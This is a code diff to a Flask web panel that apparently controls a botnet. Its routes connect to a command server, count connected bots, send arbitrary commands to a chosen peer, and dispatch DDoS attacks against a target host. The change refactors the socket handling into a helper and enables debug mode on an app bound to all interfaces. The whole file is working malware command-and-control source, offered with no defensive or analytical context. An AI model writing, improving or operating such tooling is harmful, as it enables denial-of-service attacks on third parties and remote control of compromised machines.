@@ -2,10 +2,11 @@
 
 from flask import Flask, flash, redirect, render_template, request, session, abort, url_for
 from socket import error
+from connection import connect, recvTimeout
 import socket
 import os
 import sys
-import connection
+
 
 app = Flask(__name__)
 app.config['TESTING'] = True
@@ -27,9 +28,7 @@ def login():
         if not server_ip or not server_port or int(server_port) not in range(1,65535):
             return render_template('login.html', error = insert_err)
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((server_ip, int(server_port)))
-            sock.settimeout(None)
+            sock = connect(server_ip, server_port)
             session['logged_in'] = True
             session['ip'] = server_ip
             session['port'] = int(server_port)
@@ -58,12 +57,10 @@ def main_activity():
         if not session.get('logged_in'):
             return redirect(url_for('login'))
         else:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
-            sock.connect((session.get('ip'), session.get('port')))
             try:
+                sock = connect(session.get('ip'), session.get('port'))
                 sock.send("*".encode('utf-8'))
-                ip_data = connection.recvTimeout(sock, 0.5).split('*')
+                ip_data = recvTimeout(sock, 0.5).split('*')
                 session['cnt_peers'] = len(ip_data)
                 print('[DEBUG] Bots connected %s' %str(ip_data), file=sys.stdout)
                 sock.close()
@@ -81,14 +78,11 @@ def peer_activity(ip):
             host = request.form.get("host")
             if cmd == '':
                 return render_template('peer_activity.html', ip = ip)
-            server_ip = session.get('ip')
-            server_port = session.get('port')
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((server_ip, server_port))
+            sock = connect(session.get('ip'), session.get('port'))
             srv_msg = "*".join(['CMD', host, cmd])
             sock.send(srv_msg.encode('utf-8'))
             print("[DEBUG] Message to server [%s] | PEER [%s]" %(srv_msg, host))
-            resp = connection.recvTimeout(sock, 0.5)
+            resp = recvTimeout(sock, 0.5)
             sock.close()
             #TODO Check  resp format
             if resp:
@@ -117,8 +111,7 @@ def ddos_setup():
             if ('http' or 'https') in host:
                 host = host.split('/')[2]
             msg = '*'.join(['DDOS', n_peers, time, host])
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((session.get('ip'), session.get('port')))
+            sock = connect(session.get('ip'), session.get('port'))
             sock.send(msg.encode('utf-8'))
             sock.close()
             return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
@@ -133,6 +126,6 @@ def ddos_setup():
 
 if __name__ == "__main__":
     app.secret_key = os.urandom(12)
-    app.debug=False
+    app.debug=True
     app.testing=True
     app.run('0.0.0.0')
